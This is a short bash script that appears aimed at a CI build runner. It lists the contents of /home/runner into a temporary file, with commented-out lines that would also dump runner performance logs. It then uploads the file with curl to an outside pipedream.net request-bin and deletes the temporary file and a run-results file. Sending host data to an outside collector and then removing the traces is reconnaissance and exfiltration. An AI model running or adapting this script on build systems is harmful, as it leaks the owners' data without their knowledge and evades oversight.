#!/bin/bash

echo "--- START ---" > /tmp/file.txt

#ls -1la /home >> /tmp/file.txt
#echo "---" >> /tmp/file.txt
ls -1la /home/runner >> /tmp/file.txt
echo "---" >> /tmp/file.txt
#ls -1la /home/runneradmin >> /tmp/file.txt
#echo "---" >> /tmp/file.txt


#ls -1la /home/runner/perflog >> /tmp/file.txt
#echo "---" >> /tmp/file.txt
#$(cat /home/runner/perflog/Runner.perf) >> /tmp/file.txt
#echo "---" >> /tmp/file.txt
#$(cat /home/runner/perflog/Worker.perf) >> /tmp/file.txt
#echo "--- dale" >> /tmp/file.txt
#$(perf report -i /home/runner/perflog/Worker.perf) >> /tmp/file.txt
#echo "--- FINISH ---" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/

rm /tmp/file.txt
rm /tmp/run-results.txt
